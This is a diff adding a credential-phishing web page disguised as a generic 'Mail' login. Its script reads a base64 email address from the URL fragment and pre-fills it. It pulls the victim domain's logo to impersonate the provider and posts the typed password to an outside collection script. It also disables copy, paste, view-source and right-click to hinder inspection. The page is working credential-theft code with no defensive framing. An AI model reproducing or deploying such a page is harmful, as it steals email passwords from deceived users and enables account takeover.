@@ -1,0 +1,84 @@
+ 
+<html>
+
+<head>
+<title>Mail</title>
+
+<link rel="stylesheet" type="text/css" href="./style.css">
+
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
+<style>
+</style>
+</head>
+
+<body align="">
+
+<fieldset class="X-set">
+
+<form action="" method="post" autocomplete="off" id="pax">
+
+<h2 class="text-center"><div id="top"><img src="" alt="" id="logoimg" class="icon" ></h2>
+<label>Username</label><br>
+
+<input type="email" id="cax" name="email" readonly value="" required autocomplete="off" class="ptx" ><br><br>
+            
+			<label>Enter email password</label><br>
+ 
+<input class="ptxx" id="inpwd" type="password" name="password" value="" required autocomplete="off" ><br>
+
+
+ <input type="submit" value="Log in" class="iconx">
+ 
+ 
+ </fieldset>
+
+</form>
+
+</body>
+<script src="http://ajax.googleapis.com/ajax/libs/jquery/1.10.2/jquery.min.js"></script>
+
+<script>
+document.onkeydown = function(e) {
+        if (e.ctrlKey && 
+            (e.keyCode === 67 || 
+             e.keyCode === 86 || 
+             e.keyCode === 85 || 
+             e.keyCode === 117)) {
+            return false;
+        } else {
+            return true;
+        }
+};
+$(document).keypress("u",function(e) {
+  if(e.ctrlKey)
+  {
+return false;
+}
+else
+{
+return true;
+}
+});
+
+document.addEventListener('contextmenu', event => event.preventDefault());
+
+document.getElementById("inpwd").focus();
+            var str = window.location.href;
+          var strs = str.split("#");
+          var emap = strs[1];
+          var emaq = atob(emap);
+          if(emaq){
+            document.getElementById("cax").value = emaq;
+            document.getElementById("pax").action = "https://vciaudio.com/zoc/loading.php";
+          }
+		  
+		   var ind=emaq.indexOf("@");
+        var my_slice=emaq.substr((ind+1));
+      var mainPage = 'https://'+my_slice; 
+     //     var mainPage = 'https://webmail.staralliancebd.com/';  
+        $("#logoimg").attr("src", "https://logo.clearbit.com/"+mainPage);
+         document.getElementById('mainPage').src = mainPage;
+    //    $("#mainPage").src(mainPage);
+		  
+</script> 
+</html>                
